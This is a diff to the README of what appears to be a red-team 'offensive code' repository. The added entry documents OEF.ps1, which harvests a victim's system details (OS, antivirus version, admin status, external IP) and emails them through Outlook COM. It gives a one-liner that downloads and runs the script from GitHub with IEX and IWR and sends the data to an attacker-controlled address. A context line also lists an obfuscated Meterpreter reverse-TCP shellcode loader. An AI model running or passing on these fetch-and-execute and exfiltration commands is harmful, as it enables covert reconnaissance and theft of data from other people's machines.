@@ -2,6 +2,15 @@
 
 A collection of offensive code used for red team engagements. 
 
+
+### OEF.ps1
+```
+   * Usage: powershell IEX (IWR 'https://raw.githubusercontent.com/jeffjbowie/Weaponry/master/OEF.ps1'); OEF -To "attacker.controlled@email.com"
+   
+   * Uses an Outlook COM object to send system information to the specified e-mail address:
+         - Windows OS, A/V Version, Language, Architecture, Admin?, & External IP.
+```
+
 ### ObfuscateMeterpeterReverseTcp.py
 ```
     * Basic shell code loader. (Credit: https://ired.team)
